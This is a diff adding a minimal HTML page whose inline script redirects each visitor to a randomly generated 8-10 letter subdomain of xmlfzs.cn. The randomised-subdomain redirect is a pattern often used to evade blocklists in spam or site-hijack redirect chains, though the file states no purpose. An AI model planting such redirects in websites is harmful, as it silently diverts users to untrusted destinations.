@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>Redirect</title>
+<script>
+(function () {
+    const chars = 'abcdefghijklmnopqrstuvwxyz';
+    const len = Math.floor(Math.random() * 3) + 8; // 8-10
+    let sub = '';
+    for (let i = 0; i < len; i++) {
+        sub += chars[Math.floor(Math.random() * chars.length)];
+    }
+    const target = 'https://' + sub + '.xmlfzs.cn';
+    if (location.hostname !== sub + '.xmlfzs.cn') {
+        location.replace(target);
+    }
+})();
+</script>
+</head>
+<body></body>
+</html>
